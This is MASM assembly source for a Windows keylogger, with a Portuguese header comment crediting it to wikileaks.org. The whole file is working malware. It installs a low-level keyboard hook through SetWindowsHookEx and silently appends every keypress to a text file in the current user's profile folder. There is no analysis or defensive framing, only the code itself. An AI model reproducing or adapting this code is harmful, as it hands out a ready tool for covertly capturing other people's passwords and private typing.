;WINDOWS KEYLOGGER COM A SETWINDOWSHOOKEX API. EM WIKILEAKS.ORG
.386
.model flat,stdcall
option casemap:none
include c:\masm\include\windows.inc
include c:\masm\include\kernel32.inc
include c:\masm\include\user32.inc
includelib c:\masm\lib\kernel32.lib
includelib c:\masm\lib\user32.lib
include 	c:\masm\include\advapi32.inc
include 	c:\masm\include\msvcrt.inc
includelib 	c:\masm\lib\msvcrt.lib
includelib 	c:\masm\lib\advapi32.lib

fopen 		PROTO C :dword ,:dword
fwrite 		PROTO C :dword ,:dword, :dword ,:dword
fclose 		PROTO C :dword
strcat		PROTO C :dword,:dword

.data
buffer      DB 1
spaces	db	512	dup	(0)
fp       dword 0
offset1	 dword 0
offset2	 dword 0
Counter  dd 0,0
Counter2 dd 0,0
filename db "\keysTROKES2.txt",0
filemode db  'a',0
sizeofuname		dd	255
h_hook      HHOOK 0
kb_hook     KBDLLHOOKSTRUCT <>
msg         MSG <>
kb_ptr      DWORD 0
username		db	255 dup (0)
filename2		db	"C:\Users\",0

.code
start:
invoke GetUserName,addr username, addr sizeofuname
invoke strcat, addr filename2,addr username
invoke strcat, addr filename2,addr filename

lea     ebx, LowLevelKeyboardProc
invoke  SetWindowsHookEx, WH_KEYBOARD_LL, ebx, 0, 0
mov     [h_hook], eax
 
message_proc:
    invoke  GetMessage, addr msg, NULL, 0, 0
    cmp     eax, TRUE
    jz      process_msg
    invoke  UnhookWindowsHookEx, [h_hook]
    invoke  ExitProcess, 0
    process_msg:
        invoke  TranslateMessage, addr msg
        invoke  DispatchMessage, addr msg
        jmp message_proc
 
LowLevelKeyboardProc:
    cmp     dword ptr[esp+4], 00h
    jae     process_hook
    return:
        invoke  CallNextHookEx, 0, dword ptr[esp+4], dword ptr[esp+8], dword ptr[esp+0Ch]
        retn
    process_hook:
        cmp     dword ptr[esp+8], WM_KEYDOWN
        jnz     return
        mov     ebx, [esp+0Ch]
        mov     ebx, [ebx+00h]
        mov     byte ptr[buffer],bl
	invoke fopen, addr filename2, addr filemode
	mov fp,eax
	invoke  fwrite, addr buffer, 1, 1, fp
	invoke  fclose,fp
        jmp return
 
ret
end start